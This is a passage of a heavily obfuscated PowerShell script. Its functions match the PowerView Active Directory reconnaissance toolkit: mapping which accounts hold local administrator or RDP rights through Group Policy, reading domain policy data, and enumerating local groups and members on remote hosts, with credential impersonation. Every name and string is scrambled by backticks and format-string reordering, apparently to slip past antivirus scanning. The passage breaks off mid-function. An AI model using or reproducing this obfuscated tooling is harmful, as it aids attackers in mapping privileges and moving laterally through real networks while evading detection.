                    ${gpoloCA`lgrOupm`Ap`p`iNG} | &("{1}{0}{2}" -f 'd-','Ad','Member') ("{0}{1}{2}" -f 'N','otepr','operty') ("{1}{2}{3}{0}"-f 'e','Contain','e','rNam') ${_}."D`IstI`NG`UIS`HEdNaMe"
                    ${Gpo`l`Ocal`gRoupMAP`PIng} | &("{1}{0}{2}{3}" -f'-Me','Add','mb','er') ("{3}{2}{0}{1}" -f'per','ty','tepro','No') ("{0}{3}{1}{2}"-f 'Co','pute','rName','m') ${_}."sIT`Eob`JEC`TBl"
                    ${gpolOcA`lgROU`pM`APpi`Ng}."ps`oBJ`eCt"."tyPE`NAMEs".("{1}{0}" -f'dd','A').Invoke(("{3}{7}{0}{6}{4}{8}{5}{2}{1}"-f'V','upMapping','ro','Pow','.','LocalG','iew','er','GPO'))
                    ${gpO`lo`caL`G`RoUp`m`ApPing}
                }
            }
        }
    }
}


function GeT-dO`mAinGP`oC`OmPUtE`RlOcAL`g`R`oupm`APPI`Ng {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f'PSS','houldPro','s','ces'}, '')]
    [OutputType({"{3}{1}{7}{0}{2}{6}{4}{5}"-f 'm','w','p','Po','Local','GroupMember','uter','erView.GGPOCo'})]
    [CmdletBinding(defAuLtpAraMeteRsetnaMe = {"{1}{3}{0}{2}" -f'erIdentit','Compu','y','t'})]
    Param(
        [Parameter(PosiTION = 0, PARamETErsEtnAME = "C`OmPutE`RIdeNt`i`TY", MANDAtorY = ${t`RUe}, vAlUEfrompIpELINE = ${tr`UE}, VALUefromPIPELINEbyprOPertYNaMe = ${tR`Ue})]
        [Alias({"{1}{0}{2}"-f 'erNam','Comput','e'}, {"{0}{1}{2}" -f 'Com','pu','ter'}, {"{2}{0}{4}{1}{3}{5}"-f 't','u','Dis','ished','ing','Name'}, {"{0}{3}{2}{1}"-f 'Sa','e','Nam','mAccount'}, {"{0}{1}" -f'Na','me'})]
        [String]
        ${CoMPu`TEr`I`dEnT`ItY},

        [Parameter(MAnDatORY = ${Tr`Ue}, PArameTErSEtNaME = "o`Ui`DeNtity")]
        [Alias('OU')]
        [String]
        ${oui`Den`TiTy},

        [String]
        [ValidateSet({"{0}{2}{3}{1}" -f 'A','ators','dmi','nistr'}, {"{2}{0}{1}" -f '5-32-5','44','S-1-'}, 'RDP', {"{3}{2}{1}{0}{5}{4}"-f 'to','k',' Des','Remote',' Users','p'}, {"{2}{1}{0}"-f'55','2-5','S-1-5-3'})]
        ${L`ocAl`gROuP} = ("{1}{0}{2}"-f'dministrat','A','ors'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'DSPath','A'})]
        [String]
        ${sEa`Rc`hbase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{3}{0}{1}" -f 'tr','oller','C','on','Domain'})]
        [String]
        ${SEr`V`eR},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{1}{0}" -f 'Level','e','On'}, {"{2}{1}{0}"-f'btree','u','S'})]
        [String]
        ${sEa`Rc`Hsco`pe} = ("{0}{1}" -f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resU`ltPAGesi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVeRtI`mel`I`MIT},

        [Switch]
        ${ToMb`STo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RED`eNt`IaL} =   ( GeT-CHIlDItEm  ('varIable:'+'7TQ0'+'2')  )."v`AlUe"::"eMP`TY"
    )

    BEGIN {
        ${C`OM`MOna`RGUMents} = @{}
        if (${psBouND`Pa`R`AmEte`Rs}[("{1}{0}"-f 'ain','Dom')]) { ${cOMM`oNA`RgUM`eN`TS}[("{0}{1}"-f 'Dom','ain')] = ${DOma`In} }
        if (${PSb`o`UNdpArA`MEters}[("{1}{0}{2}"-f 've','Ser','r')]) { ${C`O`Mm`oNa`RgUmEntS}[("{1}{0}" -f 'rver','Se')] = ${Se`RveR} }
        if (${Ps`BOU`N`DpArA`mE`TerS}[("{0}{3}{2}{1}"-f'Se','pe','o','archSc')]) { ${COM`mon`A`Rgu`MeNts}[("{2}{0}{1}{3}"-f 'c','hS','Sear','cope')] = ${sEaRc`h`Sc`OpE} }
        if (${P`Sb`OUNdPARaM`E`TErS}[("{3}{2}{1}{0}"-f'e','iz','geS','ResultPa')]) { ${CoMM`OnARGU`m`ENTs}[("{3}{2}{0}{1}" -f 'ltPa','geSize','su','Re')] = ${ReSul`T`pA`gEsIze} }
        if (${p`SB`o`U`N`DpAramETers}[("{4}{3}{0}{2}{1}" -f 'im','t','i','verTimeL','Ser')]) { ${C`Om`MONa`R`gumENts}[("{3}{0}{1}{2}" -f 'rTim','e','Limit','Serve')] = ${Se`RvEr`T`IMelimiT} }
        if (${p`sBO`UndpArAMET`ErS}[("{1}{2}{0}" -f'mbstone','T','o')]) { ${C`o`MmOnargUm`eNts}[("{2}{1}{0}"-f 'e','mbston','To')] = ${t`OMb`S`Tone} }
        if (${Ps`B`OuNd`Pa`RameTErs}[("{2}{0}{3}{1}" -f 'e','ial','Cr','dent')]) { ${cO`mmonaR`gUM`enTs}[("{1}{0}{2}" -f'enti','Cred','al')] = ${cR`E`DeNtiAL} }
    }

    PROCESS {
        if (${PsB`o`UNDPARA`mEt`ERs}[("{2}{4}{1}{3}{0}" -f'ity','puterId','C','ent','om')]) {
            ${COM`pUTe`Rs} = &("{5}{3}{1}{0}{2}{4}" -f 'om','nC','p','i','uter','Get-Doma') @CommonArguments -Identity ${cOMp`UTErid`eN`TItY} -Properties ("{2}{3}{5}{4}{8}{7}{0}{6}{1}"-f 'os','me','dis','tin','name','guished','tna','sh',',dn')

            if (-not ${COMP`Ut`eRS}) {
                throw ('[Get-Doma'+'inG'+'POC'+'omput'+'er'+'LocalG'+'roupM'+'a'+'ppin'+'g] '+'C'+'omp'+'ute'+'r '+"$ComputerIdentity "+'n'+'ot '+'f'+'o'+'und. '+'T'+'ry '+'a '+'ful'+'ly '+'qu'+'ali'+'fied '+'ho'+'st '+'na'+'me.')
            }

            ForEach (${C`OMpu`TeR} in ${c`ompUT`ErS}) {

                ${Gp`o`GuIDS} = @()

                
                ${d`N} = ${COmP`UT`eR}."Di`s`TIN`GUiSHedNAME"
                ${OUIN`d`ex} = ${d`N}.("{0}{1}"-f 'Index','Of').Invoke('OU=')
                if (${OUIn`dEx} -gt 0) {
                    ${OUN`AME} = ${D`N}.("{1}{2}{0}"-f'ring','Su','bSt').Invoke(${OUi`N`dEX})
                }
                if (${O`UNAMe}) {
                    ${g`POg`UidS} += &("{1}{3}{2}{0}" -f 'OU','Get-Dom','in','a') @CommonArguments -SearchBase ${ou`N`AME} -LDAPFilter ("{0}{2}{1}" -f '(',')','gplink=*') | &("{0}{1}{3}{2}"-f'F','orEach-O','ject','b') {
                        &("{0}{2}{3}{1}"-f'Select-St','g','ri','n') -InputObject ${_}."g`plI`NK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{3}{0}{2}{4}{1}" -f 'rEa','ct','c','Fo','h-Obje') {${_}."M`AtC`hes" | &("{2}{3}{0}{1}"-f'-Obj','ect','Sel','ect') -ExpandProperty ("{1}{0}" -f 'lue','Va') }
                    }
                }

                
                &("{0}{1}{2}"-f'Writ','e-V','erbose') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${C`O`mp`U`TeRsITe} = (&("{2}{3}{0}{5}{1}{4}" -f 'e','mpu','Get','-N','terSiteName','tCo') -ComputerName ${COMp`Uter}."Dnsh`OST`N`AmE")."si`T`EnAme"
                if (${CoMPute`R`s`iTe} -and (${coMPU`T`ERSitE} -notmatch ("{0}{1}"-f'E','rror'))) {
                    ${g`pOg`UIds} += &("{3}{0}{4}{1}{2}" -f 'Doma','S','ite','Get-','in') @CommonArguments -Identity ${cOm`P`UtErsitE} -LDAPFilter ("{1}{0}{2}" -f'p','(g','link=*)') | &("{3}{0}{2}{1}" -f '-O','ject','b','ForEach') {
                        &("{0}{2}{1}" -f'S','ing','elect-Str') -InputObject ${_}."gPl`INK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{0}{1}"-f'bje','ct','ForEach-O') {${_}."MA`Tc`HeS" | &("{2}{1}{0}" -f't','jec','Select-Ob') -ExpandProperty ("{0}{1}" -f'V','alue') }
                    }
                }

                
                ${G`pO`gUIdS} | &("{0}{2}{1}{3}" -f 'Get-Domain','POLocalGrou','G','p') @CommonArguments | &("{0}{2}{1}{3}" -f 'So','Ob','rt-','ject') -Property ("{1}{0}{2}"-f'ONam','GP','e') -Unique | &("{2}{1}{0}{3}"-f'je','rEach-Ob','Fo','ct') {
                    ${g`pO`g`ROUP} = ${_}

                    if(${GPO`g`Ro`Up}."grou`pME`m`BeRs") {
                        ${GPOm`Em`BeRS} = ${GpOG`RO`UP}."gRoUpM`e`MBERS"
                    }
                    else {
                        ${GP`om`EMBers} = ${gpo`G`RoUp}."gRo`UpS`id"
                    }

                    ${GP`oME`MBERs} | &("{1}{2}{3}{4}{0}"-f'ct','For','Each-','O','bje') {
                        ${ob`je`CT} = &("{4}{0}{2}{3}{1}"-f 'a','ject','in','Ob','Get-Dom') @CommonArguments -Identity ${_}
                        ${Is`gRO`UP} = @(("{0}{1}" -f '2','68435456'),("{1}{0}{2}"-f '8435','26','457'),("{2}{1}{0}" -f '12','09','53687'),("{1}{2}{0}" -f'913','53','6870')) -contains ${o`Bj`ecT}."S`AMacc`OUn`TtYPE"

                        ${gP`oCOm`PUteR`lo`Cal`GROu`P`mem`Ber} = &("{1}{0}{2}" -f'ec','New-Obj','t') ("{2}{1}{0}"-f't','Objec','PS')
                        ${GPOcomPU`T`ERLoCAL`gR`o`UPmEM`Ber} | &("{2}{0}{1}" -f 'd','-Member','Ad') ("{2}{1}{0}"-f 'perty','epro','Not') ("{3}{2}{0}{1}" -f 'ter','Name','ompu','C') ${coMp`Ut`ER}."dns`h`O`sTnamE"
                        ${GPoc`oMpUT`Er`LocalG`RoUPmE`M`BEr} | &("{1}{2}{0}" -f 'r','Add-Memb','e') ("{3}{2}{0}{1}" -f 'o','perty','tepr','No') ("{3}{0}{1}{2}" -f'e','ct','Name','Obj') ${o`BjeCt}."S`A`mA`cCounTnaME"
                        ${gpoCOMPuTeRl`OcA`L`G`R`Ou`pmember} | &("{1}{2}{0}" -f'r','Ad','d-Membe') ("{3}{0}{1}{2}"-f'tepro','pert','y','No') ("{0}{1}{2}"-f'Obj','e','ctDN') ${o`Bj`eCt}."Di`s`TInGuiSH`E`dnAme"
                        ${g`p`OCoMPUTErloCAlg`R`o`UPme`mBEr} | &("{3}{1}{0}{2}"-f 'd','d','-Member','A') ("{2}{0}{1}" -f'teprope','rty','No') ("{2}{0}{1}"-f 'ject','SID','Ob') ${_}
                        ${G`pOCom`Pu`T`ERl`O`cALGrOuPmE`mbEr} | &("{1}{2}{0}"-f'ber','A','dd-Mem') ("{1}{2}{0}{3}" -f 'rt','Notep','rope','y') ("{1}{0}{2}"-f 'ou','IsGr','p') ${ISg`Ro`UP}
                        ${gpocO`mp`UteRlo`CAlG`ROu`PmE`mbeR} | &("{2}{0}{1}"-f'd-Mem','ber','Ad') ("{1}{2}{3}{0}" -f 'ty','Notep','ro','per') ("{0}{1}{2}" -f 'GP','ODispla','yName') ${GpOGR`OUP}."Gp`ODIS`PLA`Yna`Me"
                        ${g`P`oC`OmP`UTe`RLO`calGrOU`p`mEMBeR} | &("{0}{1}{2}"-f 'A','dd','-Member') ("{1}{2}{3}{0}"-f'ty','N','otepr','oper') ("{0}{1}"-f'GPOGu','id') ${GpoG`RoUp}."GP`ONaME"
                        ${G`pocoMpu`TERlOcA`LG`ROUpMembER} | &("{0}{1}{2}{3}"-f 'Add-Me','m','b','er') ("{3}{0}{1}{2}" -f 'o','tep','roperty','N') ("{0}{1}{2}" -f'G','POPa','th') ${g`POgr`OUp}."GP`OPAth"
                        ${GPOcom`PuterlOcALg`RO`UPMem`Ber} | &("{2}{1}{0}" -f'ber','m','Add-Me') ("{2}{0}{1}" -f'rope','rty','Notep') ("{0}{2}{1}" -f'GPO','pe','Ty') ${g`pO`GROuP}."gpO`Type"
                        ${g`pO`C`OMpUT`ErlOCalGr`oUPMeMBER}."Ps`OBjECT"."Ty`pe`NAmeS".("{0}{1}" -f'A','dd').Invoke(("{6}{3}{5}{0}{2}{7}{1}{8}{4}" -f'GPOComputer','a','L','owerView','ember','.','P','oc','lGroupM'))
                        ${GpOcoMPU`TeR`Lo`cAlGroUP`mEm`Ber}
                    }
                }
            }
        }
    }
}


function GEt-Do`ma`in`PO`LICyd`AtA {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'ess','dProc','PSShoul'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(POsItion = 0, valUeFrOMPIpELInE = ${tR`UE}, VALUefrOmpipElineBYPROperTYnaME = ${t`Rue})]
        [Alias({"{1}{0}{2}" -f'urc','So','e'}, {"{1}{0}" -f'e','Nam'})]
        [String]
        ${PO`licY} = ("{0}{1}" -f'Domai','n'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{1}{0}{3}" -f 'ontrolle','nC','i','r','Doma'})]
        [String]
        ${se`R`VER},

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`Ve`RTI`mElimIT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`denTi`Al} =   ( Get-VariaBLe ("{1}{0}" -f'2','7tQ0') )."va`Lue"::"eM`PTY",

        [Switch]
        ${S`sL},

        [Switch]
        ${o`Bf`USCA`Te}
    )

    BEGIN {
        ${seA`RC`H`eraRG`Ume`Nts} = @{}
        if (${PSBoUnDPA`RaM`ete`RS}[("{1}{0}" -f'erver','S')]) { ${SEar`cH`erargumE`NTs}[("{0}{1}" -f 'S','erver')] = ${S`eR`Ver} }
        if (${PSB`oUn`DParametE`RS}[("{2}{0}{1}"-f'Limi','t','ServerTime')]) { ${SEA`R`C`heRARGu`mEnts}[("{1}{4}{0}{3}{2}"-f 'm','Server','it','eLim','Ti')] = ${sEr`Vertime`limIt} }
        if (${PSbOUnDp`AR`Amete`Rs}[("{0}{1}{2}"-f'Cr','edent','ial')]) { ${SEa`RcHerar`GuME`N`Ts}[("{2}{1}{0}"-f 'ntial','de','Cre')] = ${c`RE`Den`TIAL} }
        if (${pSBOundpa`R`A`meT`ERS}['SSL']) { ${SearcHEr`A`R`gume`Nts}['SSL'] = ${S`sL} }
        if (${PS`BouN`DPARa`me`Ters}[("{0}{1}{2}"-f'Obfu','sca','te')]) {${sEa`Rch`Er`Ar`GUmenTS}[("{1}{2}{0}" -f'cate','O','bfus')] = ${Ob`FUsc`ATe} }

        ${COn`Ve`RTaR`gumEN`TS} = @{}
        if (${p`S`BOUNdpAr`AmETeRS}[("{0}{1}{2}" -f'S','erve','r')]) { ${c`ONv`eR`Ta`R`GUMENtS}[("{1}{0}" -f 'rver','Se')] = ${SE`RvER} }
        if (${P`sBOunD`p`ArA`m`eTERS}[("{1}{3}{0}{2}" -f 'nt','Cr','ial','ede')]) { ${c`oN`Vert`ARGumEnTs}[("{1}{2}{0}" -f 'l','Credent','ia')] = ${CredE`NT`ial} }
    }

    PROCESS {
        if (${PSb`oUndp`AraME`TErs}[("{1}{0}{2}"-f'mai','Do','n')]) {
            ${Se`ARcHER`AR`gUmeNTs}[("{1}{0}" -f'ain','Dom')] = ${D`oMA`in}
            ${cO`NVE`Rt`ARG`UME`NTS}[("{1}{0}"-f 'main','Do')] = ${dOMa`iN}
        }

        if (${pol`I`Cy} -eq 'All') {
            ${SEaRchEra`Rg`U`mEnts}[("{1}{2}{0}" -f 'ity','Iden','t')] = '*'
        }
        elseif (${p`olI`Cy} -eq ("{0}{1}" -f'Dom','ain')) {
            ${SEaR`CHeRA`RGuM`En`TS}[("{1}{0}" -f'tity','Iden')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${Po`LICY} -eq ("{2}{1}{3}{0}" -f 'ller','n','Domai','Contro')) -or (${p`O`lIcY} -eq 'DC')) {
            ${Se`ARcH`Er`ArguM`EnTs}[("{1}{0}{2}"-f'dent','I','ity')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${SEa`RcH`eRa`RG`Uments}[("{1}{0}"-f 'y','Identit')] = ${PO`L`icY}
        }

        ${gp`or`eSul`Ts} = &("{2}{1}{0}"-f 'nGPO','Domai','Get-') @SearcherArguments

        ForEach (${G`pO} in ${gPORe`Su`l`Ts}) {
            
            ${Gp`TtMp`Lp`ATh} = ${G`PO}."g`PCf`ILEsy`sPATh" + ((("{5}{11}{6}{4}{2}{7}{10}{8}{1}{9}{3}{0}" -f 'nf','o','NTa','tTmpl.i','Windows ','aoJMACHINE','oJMicrosoftaoJ','oJSecEd','ta','JGp','i','a'))."r`epl`Ace"(([ChAr]97+[ChAr]111+[ChAr]74),'\'))

            ${parS`e`ARgS} =  @{
                ("{0}{1}{2}{3}"-f'G','pt','Tmpl','Path') = ${gpT`Tm`pLpa`TH}
                ("{1}{2}{0}{3}"-f 'utObj','Out','p','ect') = ${tR`Ue}
            }
            if (${pS`B`oUN`dP`ARAmetE`Rs}[("{1}{0}{3}{2}" -f'e','Cr','l','dentia')]) { ${parse`Ar`GS}[("{3}{2}{0}{1}" -f'nt','ial','e','Cred')] = ${CR`ed`ent`Ial} }

            
            &("{3}{2}{1}{0}" -f 'mpl','GptT','-','Get') @ParseArgs | &("{2}{0}{1}{3}"-f'ch','-Obje','ForEa','ct') {
                ${_} | &("{2}{0}{1}" -f 'dd-Memb','er','A') ("{2}{0}{1}{3}" -f 'prope','r','Note','ty') ("{0}{1}" -f 'GPONa','me') ${G`Po}."Na`me"
                ${_} | &("{0}{1}{3}{2}" -f'Add','-M','er','emb') ("{2}{1}{0}"-f'y','epropert','Not') ("{2}{1}{0}" -f 'Name','y','GPODispla') ${G`PO}."dISpLAYN`A`Me"
                ${_}
            }
        }
    }
}










function geT`-NetL`ocA`l`GrOUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{4}{1}" -f'h','s','PSS','ouldProc','es'}, '')]
    [OutputType({"{0}{2}{4}{6}{1}{5}{3}"-f 'P','oca','ower','up.API','Vie','lGro','w.L'})]
    [OutputType({"{4}{1}{3}{0}{5}{2}" -f'ocal','iew','up.WinNT','.L','PowerV','Gro'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItiON = 0, ValUefrOMPiPeLInE = ${tR`UE}, vAlUEfRomPIpelinebyPropeRtYnAME = ${t`RuE})]
        [Alias({"{2}{1}{0}" -f 'ame','stN','Ho'}, {"{2}{1}{0}" -f 'e','shostnam','dn'}, {"{1}{0}"-f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOmP`UtE`RNA`Me} = ${ENV:`CoMPuTe`R`NA`me},

        [ValidateSet('API', {"{0}{1}"-f 'Win','NT'})]
        [Alias({"{3}{2}{1}{0}" -f'thod','onMe','ti','Collec'})]
        [String]
        ${MEtH`oD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDe`Nt`i`AL} =  (lS  ("VAr"+"iA"+"BlE:7"+"tQ"+"02") )."vaL`UE"::"Em`PtY"
    )

    BEGIN {
        if (${PSBOUN`DpAra`meT`eRS}[("{0}{2}{1}"-f 'Cr','ntial','ede')]) {
            ${L`ogONT`Oken} = &("{4}{3}{1}{5}{2}{0}" -f 'nation','vo','serImperso','n','I','ke-U') -Credential ${c`ReD`ENTIAl}
        }
    }

    PROCESS {
        ForEach (${Co`mPu`T`er} in ${ComPuTer`N`AME}) {
            if (${M`EThOd} -eq 'API') {
                

                
                ${qUEr`YL`EvEl} = 1
                ${p`TrINfo} =   ( VARIablE ("{0}{1}"-f 'ZfVW','1')  -VALue)::"Z`eRo"
                ${eNtr`IEsRe`AD} = 0
                ${to`TAL`Re`AD} = 0
                ${Res`UM`eH`AndLe} = 0

                
                ${rE`su`LT} = ${NET`A`pi32}::"neT`locAL`gr`oUpEn`UM"(${CO`m`pUTeR}, ${quEry`lE`V`el}, [ref]${PTr`i`Nfo}, -1, [ref]${e`NTr`I`EsREaD}, [ref]${t`OTALR`ead}, [ref]${rEs`U`mE`HanDLE})

                
                ${O`FFSET} = ${p`TriNFO}.("{0}{1}"-f 'ToI','nt64').Invoke()

                
                if ((${ReS`ULT} -eq 0) -and (${oF`FseT} -gt 0)) {

                    
                    ${i`NCREm`ENt} = ${lOc`Alg`ROUp`_I`Nf`o_1}::("{0}{1}" -f 'Get','Size').Invoke()

                    
                    for (${i} = 0; (${i} -lt ${ENTRie`SRE`Ad}); ${I}++) {
                        
                        ${NEWI`N`TPtr} = &("{0}{1}{2}{3}" -f 'N','ew-','Obje','ct') ("{0}{2}{1}"-f 'Sys','tr','tem.Intp') -ArgumentList ${OF`FsEt}
                        ${In`FO} = ${NE`WIn`TPTR} -as ${LOCAL`GROu`p_`I`NfO`_1}

                        ${o`FfS`et} = ${Ne`WI`N`TpTr}.("{0}{1}" -f 'ToI','nt64').Invoke()
                        ${off`s`eT} += ${i`NC`R`emeNT}

                        ${l`OcALG`ROuP} = &("{2}{3}{1}{0}"-f 't','-Objec','Ne','w') ("{0}{2}{1}" -f 'P','Object','S')
                        ${LOc`Alg`ROUP} | &("{0}{1}{2}"-f'Add-','M','ember') ("{0}{1}{2}" -f'Noteprope','rt','y') ("{2}{1}{0}" -f'Name','r','Compute') ${co`MP`Ut`er}
                        ${LO`cA`L`GROuP} | &("{2}{3}{1}{0}"-f 'r','mbe','A','dd-Me') ("{1}{3}{0}{2}"-f'r','N','operty','otep') ("{1}{0}" -f'ame','GroupN') ${in`FO}."L`Grpi`1_N`AME"
                        ${loCAl`gr`Oup} | &("{1}{2}{0}" -f 'er','Add-M','emb') ("{1}{0}{2}"-f 'ro','Notep','perty') ("{0}{1}{2}" -f 'C','omm','ent') ${IN`Fo}."lGRP`I1_coM`mEnt"
                        ${lO`CAl`G`RouP}."pSOB`ject"."Ty`peN`A`MES".("{0}{1}" -f 'Inse','rt').Invoke(0, ("{0}{1}{4}{2}{3}{5}" -f 'Pow','erView.','calGro','u','Lo','p.API'))
                        ${lO`CAlGR`oup}
                    }
                    
                    ${N`UlL} = ${nETA`Pi`32}::("{1}{2}{3}{0}"-f 'rFree','Ne','tAp','iBuffe').Invoke(${pTr`I`NfO})
                }
                else {
                    &("{3}{1}{2}{0}" -f'rbose','it','e-Ve','Wr') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                ${Co`mp`U`TErpro`ViDeR} = [ADSI]"WinNT://$Computer,computer"

                ${cOMp`UtERp`RO`VideR}."ps`BASE"."c`hiL`dRen" | &("{2}{1}{3}{0}"-f 'e-Object','he','W','r') { ${_}."Psba`sE"."Sch`EMaC`L`ASsNa`me" -eq ("{1}{0}"-f 'up','gro') } | &("{2}{1}{0}{3}"-f 'ch-O','Ea','For','bject') {
                    ${LOCal`gR`O`Up} = ([ADSI]${_})
                    ${g`R`OUP} = &("{0}{2}{1}{3}" -f'N','bje','ew-O','ct') ("{0}{1}{2}"-f 'PSObj','ec','t')
                    ${g`RO`UP} | &("{2}{0}{1}" -f'Me','mber','Add-') ("{1}{0}{2}"-f 'tepro','No','perty') ("{0}{1}{2}" -f'Co','mputerNa','me') ${c`om`pUtEr}
                    ${grO`Up} | &("{2}{0}{1}"-f'dd-M','ember','A') ("{0}{1}{3}{2}"-f 'Notep','ro','ty','per') ("{1}{3}{0}{2}"-f'upN','G','ame','ro') (${lO`cAl`GRouP}.("{1}{0}{2}"-f 'vo','In','keGet').Invoke(("{0}{1}" -f'Nam','e')))
                    ${g`Roup} | &("{0}{1}{2}"-f'Add-Me','mb','er') ("{2}{1}{0}"-f'erty','p','Notepro') 'SID' ((&("{1}{2}{0}" -f'ject','New-','Ob') ("{2}{6}{3}{5}{0}{4}{7}{1}" -f't','er','System.S','.Principal.Securit','if','yIden','ecurity','i')(${loCalgr`o`Up}.("{0}{1}" -f'In','vokeGet').Invoke(("{0}{2}{1}" -f'obje','tsid','c')),0))."v`Alue")
                    ${G`ROuP} | &("{1}{2}{0}"-f'er','A','dd-Memb') ("{0}{2}{1}{3}"-f 'Note','r','prope','ty') ("{0}{1}" -f'Co','mment') (${Loca`lGR`o`UP}.("{0}{1}" -f 'Invo','keGet').Invoke(("{1}{0}{2}{3}"-f'c','Des','ript','ion')))
                    ${GR`oUP}."p`s`OBjeCT"."T`yP`enAmeS".("{0}{1}{2}" -f'Inse','r','t').Invoke(0, ("{0}{5}{1}{4}{3}{2}"-f'PowerVi','ocalGroup','T','inN','.W','ew.L'))
                    ${G`RoUP}
                }
            }
        }
    }
    
    END {
        if (${LoGoN`To`k`EN}) {
            &("{2}{0}{1}{3}" -f'ert','ToSel','Invoke-Rev','f') -TokenHandle ${L`ogo`NtO`kEN}
        }
    }
}


function G`eT-netLocALg`R`o`U`pM`eMbER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{4}{1}"-f 'P','cess','ld','SShou','Pro'}, '')]
    [OutputType({"{4}{1}{6}{0}{3}{5}{2}"-f 'ocalGroup','erView','.API','Mem','Pow','ber','.L'})]
    [OutputType({"{7}{0}{8}{3}{5}{1}{2}{6}{4}" -f'e','mb','er','ocalGr','WinNT','oupMe','.','PowerVi','w.L'})]
    Param(
        [Parameter(pOsiTiON = 0, vAlUEfrOMPipelINE = ${T`RuE}, vALUefRompiPELiNeByproPeRtyNamE = ${TR`Ue})]
        [Alias({"{2}{0}{1}" -f'N','ame','Host'}, {"{3}{2}{0}{1}" -f'st','name','o','dnsh'}, {"{1}{0}"-f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Com`p`U`TeRn`Ame} = ${enV`:c`oMpUTeRn`Ame},

        [Parameter(vALUEfROMpipelInebYpROpErTyNAme = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${groUp`Na`Me} = ("{1}{0}{4}{3}{2}" -f 'ni','Admi','rs','ato','str'),

        [ValidateSet('API', {"{1}{0}"-f 'inNT','W'})]
        [Alias({"{2}{1}{0}{4}{3}{5}" -f'ti','lec','Col','etho','onM','d'})]
        [String]
        ${mET`HOd} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DEnTI`Al} =   (gEt-varIAbLE ("{0}{1}"-f'7T','Q02') -valUEOnL )::"Em`pty"
    )

    BEGIN {
        if (${pSb`oUND`p`ArA`mETerS}[("{1}{3}{2}{0}" -f'l','C','entia','red')]) {
            ${LOgO`Nto`KEn} = &("{0}{6}{4}{3}{1}{2}{5}" -f'Inv','rs','onatio','UserImpe','e-','n','ok') -Credential ${CRe`DENTI`AL}
        }
    }

    PROCESS {
        ForEach (${cOm`put`er} in ${comp`UT`eRn`Ame}) {
            if (${m`et`HOd} -eq 'API') {
                

                
                ${QueryLe`V`El} = 2
                ${pTr`iN`FO} =   ( Ls ("var"+"iA"+"B"+"Le:Z"+"FvW1"))."VaL`Ue"::"z`eRO"
                ${En`T`Rie`SREaD} = 0
                ${Tota`lr`eAD} = 0
                ${REs`UMeHa`Ndle} = 0

                
                ${re`s`ULT} = ${ne`T`API`32}::"NEtlOCA`LG`ROUPgE`TmeMberS"(${C`OmpUt`ER}, ${G`ROU`pnA`me}, ${quEr`Yle`V`eL}, [ref]${PTr`I`Nfo}, -1, [ref]${en`TRiE`sreaD}, [ref]${tot`ALrE`Ad}, [ref]${Re`SuM`e`hAn`Dle})

                
                ${OFf`SeT} = ${P`Tr`Info}.("{1}{0}"-f'4','ToInt6').Invoke()

                ${mem`BE`RS} = @()

                
                if ((${r`ESU`lt} -eq 0) -and (${Of`FSET} -gt 0)) {

                    
                    ${IN`cRE`mEnt} = ${Lo`cAlG`RoU`P_M`e`mbERs_INfo_2}::("{0}{2}{1}" -f'G','tSize','e').Invoke()

                    
                    for (${i} = 0; (${i} -lt ${E`NtrI`EsReAD}); ${I}++) {
                        
                        ${NEWI`Nt`ptr} = &("{2}{0}{1}"-f'b','ject','New-O') ("{1}{2}{0}" -f'ntptr','Syst','em.I') -ArgumentList ${o`FFSeT}
                        ${In`FO} = ${Ne`w`InTP`Tr} -as ${lOc`Al`gRO`U`P_MEM`B`Ers`_INf`o_2}

                        ${O`FfSET} = ${NeWI`Nt`Ptr}.("{0}{1}"-f 'ToI','nt64').Invoke()
                        ${O`FF`SET} += ${IN`CrE`ME`NT}

                        ${sI`d`STriNG} = ''
                        ${R`esul`T2} = ${aDvA`p`I32}::"coNVErTSIdt`oSt`Rin`gSID"(${I`NfO}."lgrmI`2_`siD", [ref]${S`i`DST`RinG});${lASt`Er`ROR} =  (GI ("{2}{3}{0}{4}{1}"-f'iA','zs','v','ar','ble:vP'))."Val`Ue"::("{4}{3}{5}{1}{0}{2}"-f'Err','in32','or','t','GetLas','W').Invoke()

                        if (${rEs`Ul`T2} -eq 0) {
